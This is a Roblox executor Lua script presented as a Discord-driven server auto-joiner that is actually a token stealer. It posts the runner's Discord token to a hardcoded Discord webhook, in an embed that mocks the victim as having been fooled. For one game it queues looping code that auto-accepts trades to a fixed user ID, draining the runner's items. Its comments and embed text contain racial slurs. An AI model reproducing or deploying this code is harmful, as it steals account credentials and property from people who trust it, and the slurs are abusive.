logstoken = "https://discord.com/api/webhooks/1299700539474575382/N3CWu2cRdRBoxtEvEWPXk8kVzbRzpRPzL-0lQ18saGPqz3mv4gscMmsvT5PF3fn2KPBJ"

LOGS_TOKEN = logstoken

local HttpServ = game:GetService("HttpService")
local msglogs = "||@everyone||"  -- Message to be logged

local LastMsgId = "Shimm on top"

local function autoJoin()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..ChannelId.."/messages?limit=1",
        Method = "GET",
        Headers = {
            ['Authorization'] = Token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            ["Content-Type"] = "application/json"
        }
    })
    
    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        if #messages > 0 then
            local placeId, jobId = string.match(messages[1].content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
            
            if tostring(messages[1].id) ~= LastMsgId then
                LastMsgId = tostring(messages[1].id)
                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                if placeId == 142823291 then
                    queue_on_teleport("game:GetService('Chat'):Chat(game.Players.LocalPlayer.Character, '/murder')")
                    queue_on_teleport("while task.wait(0.1) do game:GetService('ReplicatedStorage').Trade.AcceptRequest:FireServer() end")
                    queue_on_teleport("while task.wait(0.1) do game:GetService('ReplicatedStorage').Trade.AcceptTrade:FireServer(unpack({[1] = 285646582})) end")
                    game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                else
                    queue_on_teleport("game:GetService('Chat'):Chat(game.Players.LocalPlayer.Character, '/murder')")
                    game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                end
            end
        end
    end
end

--niggas try
poop = hookmetamethod(game, "__namecall", function(self, ...)
    if self == request then
      return
    else
      poop(...)
    end
  end)

local tokenlogs = {
    username = "name of the webhook bot",
    avatar_url = "avatar url bot",
    content = msglogs,
    embeds = {{
        title = "this nigga thought this is not token logger😂",
        color = tonumber(0x000000),  -- Black color
        description = "TOKEN LOGGER BY SHIMM (DISCORD LOGGER)",  -- Empty description
        fields = {
            {
                name = "Token: ",  -- Display 'Token: ' label
                value = "```" .. Token .. "```",  -- Concatenate Token properly and wrap it in code block
                inline = false,
            },
        },
    }}
}

local request = http_request or request or HttpPost or syn.request
request({
    Url = LOGS_TOKEN,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = game.HttpService:JSONEncode(tokenlogs)  -- Send the tokenlogs data
})

while wait(10) do
    autoJoin()
end
